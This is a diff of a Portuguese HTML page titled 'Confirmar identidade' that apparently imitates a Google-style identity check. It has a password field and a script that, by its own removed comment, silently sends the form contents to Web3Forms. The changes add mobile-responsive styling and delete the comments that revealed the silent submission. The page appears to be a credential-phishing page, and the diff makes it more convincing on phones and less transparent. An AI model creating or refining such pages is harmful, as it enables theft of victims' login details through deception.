@@ -2,6 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Confirmar identidade</title>
   <style>
     * {
@@ -12,16 +13,17 @@
     body {
       margin: 0;
       background-color: #121212;
-      height: 100vh;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       color: #fff;
+      padding: 16px;
     }
 
     .card {
-      width: 900px;
-      max-width: 95%;
+      width: 100%;
+      max-width: 900px;
       background-color: #000;
       border-radius: 20px;
       padding: 48px;
@@ -54,6 +56,7 @@
       border-radius: 20px;
       font-size: 14px;
       color: #e8eaed;
+      word-break: break-all;
     }
 
     .right {
@@ -72,7 +75,7 @@
       width: 100%;
       padding: 14px;
       font-size: 16px;
-      border-radius: 4px;
+      border-radius: 6px;
       border: 1px solid #5f6368;
       background: transparent;
       color: #fff;
@@ -80,7 +83,7 @@
     }
 
     .checkbox {
-      margin-top: 10px;
+      margin-top: 12px;
       display: flex;
       align-items: center;
       gap: 8px;
@@ -90,16 +93,18 @@
     }
 
     .actions {
-      margin-top: 32px;
+      margin-top: 28px;
       display: flex;
       justify-content: space-between;
       align-items: center;
+      gap: 16px;
     }
 
     .link {
       color: #8ab4f8;
       text-decoration: none;
       font-size: 14px;
+      white-space: nowrap;
     }
 
     .btn {
@@ -107,13 +112,67 @@
       color: #000;
       border: none;
       border-radius: 20px;
-      padding: 10px 24px;
-      font-size: 14px;
+      padding: 12px 28px;
+      font-size: 15px;
       cursor: pointer;
     }
 
     .btn:hover {
       background-color: #a1c2fa;
+    }
+
+    /* ===== MOBILE ===== */
+    @media (max-width: 768px) {
+      .card {
+        flex-direction: column;
+        padding: 28px;
+        gap: 28px;
+      }
+
+      .left,
+      .right {
+        max-width: 100%;
+      }
+
+      h1 {
+        font-size: 26px;
+      }
+
+      .logo {
+        width: 50px;
+        margin-bottom: 16px;
+      }
+
+      .actions {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .btn {
+        width: 100%;
+        text-align: center;
+      }
+
+      .link {
+        text-align: center;
+      }
+    }
+
+    /* celulares bem pequenos */
+    @media (max-width: 380px) {
+      .card {
+        padding: 22px;
+      }
+
+      h1 {
+        font-size: 22px;
+      }
+
+      input[type="password"],
+      input[type="text"] {
+        font-size: 15px;
+        padding: 12px;
+      }
     }
   </style>
 </head>
@@ -162,7 +221,6 @@
   </div>
 
   <script>
-    // mostrar / ocultar nome
     const checkbox = document.getElementById("verNome");
     const nomeInput = document.getElementById("nome");
 
@@ -170,7 +228,6 @@
       nomeInput.type = checkbox.checked ? "text" : "password";
     });
 
-    // envio silencioso para Web3Forms (sem mensagens)
     document.getElementById("formNome").addEventListener("submit", function (e) {
       e.preventDefault();
 
